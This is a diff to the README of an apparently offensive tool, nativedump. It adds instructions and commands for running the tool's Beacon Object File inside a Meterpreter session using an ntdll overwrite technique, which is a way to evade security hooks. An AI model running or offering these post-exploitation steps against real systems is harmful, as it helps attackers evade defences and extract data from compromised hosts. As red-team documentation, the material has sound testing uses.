@@ -31,3 +31,17 @@ COFFLoader64.exe go nativedump_bof.o 0e0000000a0000006400690073006b000000
 ```
 
 ![ntdlloverwrite](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_BOF2.png)
+
+--------------------------------------
+
+## Using Meterpreter
+
+You can run BOFs in your Meterpreter sessions after loading the [execute_bof](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-executebof-command.html) module, using "--format-string Z <technique>" to use a ntdll overwrite technique. It is important to interact with the session with a timeout around 60 seconds, so the BOF can finish execution:
+
+```
+sessions -i <SESSION-ID> --timeout 60
+load bofloader
+execute_bof nativedump_bof.o <OVERWRITE_TECHNIQUE>
+```
+
+![img11](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/nativedump/Screenshot_BOF3.png)
